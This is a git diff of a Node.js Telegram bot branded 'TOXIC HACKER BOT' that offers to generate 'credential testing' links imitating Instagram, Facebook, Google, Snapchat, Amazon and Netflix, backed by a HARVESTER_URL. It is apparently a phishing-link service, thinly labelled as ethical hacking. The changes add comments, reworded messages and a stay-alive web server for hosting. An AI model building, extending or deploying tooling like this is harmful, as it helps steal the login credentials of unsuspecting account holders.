@@ -1,14 +1,16 @@
 const { Telegraf, Markup } = require('telegraf');
 const fs = require('fs');
+const http = require('http'); // HTTP module for Stay-Alive server
 
+// --- ⚙️ CONFIGURATION (Loaded from Render's Environment Variables) ⚙️ ---
 const BOT_TOKEN = process.env.BOT_TOKEN;
 const HARVESTER_URL = process.env.HARVESTER_URL;
-const OWNER_ID = process.env.OWNER_ID;
+const OWNER_ID = process.env.OWNER_ID; 
 const CHANNEL_ID = process.env.CHANNEL_ID;
 const CHANNEL_LINK = process.env.CHANNEL_LINK;
 
 if (!BOT_TOKEN || !HARVESTER_URL || !OWNER_ID || !CHANNEL_ID || !CHANNEL_LINK) {
-    console.error("FATAL ERROR: Missing environment variables.");
+    console.error("FATAL ERROR: One or more environment variables are missing. Bot cannot start.");
     process.exit(1);
 }
 
@@ -16,6 +18,7 @@ const bot = new Telegraf(BOT_TOKEN);
 const DB_PATH = './db.json';
 let adminState = {};
 
+// --- DB Functions ---
 const readDb = () => {
     if (!fs.existsSync(DB_PATH)) {
         fs.writeFileSync(DB_PATH, JSON.stringify({ users: {}, admins: [parseInt(OWNER_ID)], blocked_users: [] }, null, 2));
@@ -25,10 +28,11 @@ const readDb = () => {
 const writeDb = (data) => fs.writeFileSync(DB_PATH, JSON.stringify(data, null, 2));
 const isAdmin = (id) => readDb().admins.includes(parseInt(id));
 
+// --- Start Message ---
 const startMessage = `
 🔥 *TOXIC HACKER BOT*
 
-🔍 *Credential Testing Interfaces:*
+🔗 *Credential Testing Interfaces:*
 • Facebook
 • Instagram
 • Snapchat
@@ -39,24 +43,25 @@ const startMessage = `
 ❌ Illegal Use is Prohibited.
 ✅ Ethical Hacking | OSINT | Red Teaming
 
-🔗 Join: @ToxicBack2025
+Join: @ToxicBack2025
 `;
 
+// --- KEYBOARDS ---
 const adminKeyboard = Markup.inlineKeyboard([
     [Markup.button.callback('📊 User Status', 'admin_status'), Markup.button.callback('📢 Broadcast', 'admin_broadcast')],
-    [Markup.button.callback('🔐 Generate Link', 'admin_generate_link')],
+    [Markup.button.callback('🔗 Generate Link', 'admin_generate_link')],
     [Markup.button.callback('➕ Add Admin', 'admin_add'), Markup.button.callback('➖ Remove Admin', 'admin_remove')],
-    [Markup.button.callback('🚫 Block User', 'admin_block'), Markup.button.callback('✅ Unblock User', 'admin_unblock')],
-    [Markup.button.callback('⬅️ Back to Panel', 'admin_panel_back')]
+    [Markup.button.callback('🚫 Block User', 'admin_block'), Markup.button.callback('✅ Unblock User', 'admin_unblock')]
 ]);
 
 const linkGenerationKeyboard = Markup.inlineKeyboard([
     [Markup.button.callback('📸 Instagram', 'gen_link_Instagram'), Markup.button.callback('📘 Facebook', 'gen_link_Facebook')],
-    [Markup.button.callback('🟢 Google', 'gen_link_Google'), Markup.button.callback('👻 Snapchat', 'gen_link_Snapchat')],
+    [Markup.button.callback('🇬 Google', 'gen_link_Google'), Markup.button.callback('👻 Snapchat', 'gen_link_Snapchat')],
     [Markup.button.callback('📦 Amazon', 'gen_link_Amazon'), Markup.button.callback('🎬 Netflix', 'gen_link_Netflix')],
     [Markup.button.callback('⬅️ Back to Panel', 'admin_panel_back')]
 ]);
 
+// --- /start COMMAND ---
 bot.start(async (ctx) => {
     const userId = ctx.from.id;
     const username = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name;
@@ -71,22 +76,23 @@ bot.start(async (ctx) => {
         if (!db.users[userId]) {
             db.users[userId] = { username, joinDate: new Date().toISOString() };
             writeDb(db);
-            ctx.telegram.sendMessage(OWNER_ID, `📥 *New User Joined*\n- *User:* ${username}\n- *ID:* \`${userId}\``, { parse_mode: 'Markdown' });
+            ctx.telegram.sendMessage(OWNER_ID, `*New User Joined*\n- *User:* ${username}\n- *ID:* \`${userId}\``, { parse_mode: 'Markdown' });
         }
 
         if (isAdmin(userId)) {
-            ctx.replyWithMarkdown('📟 *Admin Panel Activated*', adminKeyboard);
+            ctx.replyWithMarkdown('👑 *Admin Panel Activated*', adminKeyboard);
         } else {
             ctx.replyWithMarkdown(startMessage, Markup.inlineKeyboard(linkGenerationKeyboard.reply_markup.inline_keyboard.slice(0, -1)));
         }
     } catch {
         ctx.replyWithMarkdown(`🛑 *ACCESS DENIED*\n\nJoin our channel to continue.`, Markup.inlineKeyboard([
-            [Markup.button.url('👉 Join Channel', CHANNEL_LINK)],
+            [Markup.button.url('➡️ Join Channel', CHANNEL_LINK)],
             [Markup.button.callback('✅ I Joined', 'check_join')]
         ]));
     }
 });
 
+// --- Callback Query Handler ---
 bot.on('callback_query', async (ctx) => {
     const userId = ctx.from.id;
     const data = ctx.callbackQuery.data;
@@ -102,35 +108,30 @@ bot.on('callback_query', async (ctx) => {
     }
 
     if (isAdmin(userId) && type === 'admin') {
-        const db = readDb();
         switch (command) {
             case 'status':
+                const db = readDb();
                 const totalUsers = Object.keys(db.users).length;
-                return ctx.editMessageText(`📊 *Bot Status*\n\n👥 Users: ${totalUsers}\n🛡️ Admins: ${db.admins.length}\n🚫 Blocked: ${db.blocked_users.length}`, { parse_mode: 'Markdown', ...adminKeyboard });
+                return ctx.editMessageText(`📊 *Bot Status*\n\n👥 Users: ${totalUsers}\n👑 Admins: ${db.admins.length}\n🚫 Blocked: ${db.blocked_users.length}`, { parse_mode: 'Markdown', ...adminKeyboard });
             case 'broadcast':
             case 'add':
             case 'remove':
             case 'block':
             case 'unblock':
-                const promptMap = {
-                    broadcast: '📝 Send the message to broadcast.',
-                    add: '📝 Enter new admin ID.',
-                    remove: '📝 Enter ID to remove from admins.',
-                    block: '📝 Enter user ID to block.',
-                    unblock: '📝 Enter user ID to unblock.'
-                };
+                const promptMap = { broadcast: '...Send message to broadcast', add: '...Enter new admin ID', remove: '...Enter ID to remove', block: '...Enter user ID to block', unblock: '...Enter user ID to unblock' };
                 adminState[userId] = command;
-                return ctx.reply(promptMap[command]);
+                return ctx.reply(`✍️ ${promptMap[command]}`);
             case 'generate':
-                return ctx.editMessageText("🔐 *Generate Test Links*", linkGenerationKeyboard);
+                return ctx.editMessageText("🔗 *Generate Test Links*", linkGenerationKeyboard);
             case 'panel':
-            case 'panelback':
+            case 'panelback': // Legacy support
             case 'panel_back':
-                return ctx.editMessageText("📟 *Admin Panel*", { parse_mode: 'Markdown', ...adminKeyboard });
+                return ctx.editMessageText("👑 *Admin Panel*", { parse_mode: 'Markdown', ...adminKeyboard });
         }
     }
 });
 
+// --- Text Handler ---
 bot.on('text', async (ctx) => {
     const userId = ctx.from.id;
     const text = ctx.message.text;
@@ -175,8 +176,18 @@ bot.on('text', async (ctx) => {
     }
 });
 
+// --- "STAY-ALIVE" SERVER ---
+const PORT = process.env.PORT || 10000;
+http.createServer((req, res) => {
+    res.writeHead(200, { 'Content-Type': 'text/plain' });
+    res.end(`Bot is alive. Last check: ${new Date().toISOString()}`);
+}).listen(PORT, () => {
+    console.log(`Stay-alive server listening on port ${PORT}`);
+});
+
+// Launch the bot
 bot.launch();
-console.log('🔥 Toxic Hacker Bot is online.');
+console.log('🔥 Toxic Hacker Bot (Stay-Alive PRO) is online.');
 
 process.once('SIGINT', () => bot.stop('SIGINT'));
 process.once('SIGTERM', () => bot.stop('SIGTERM'));
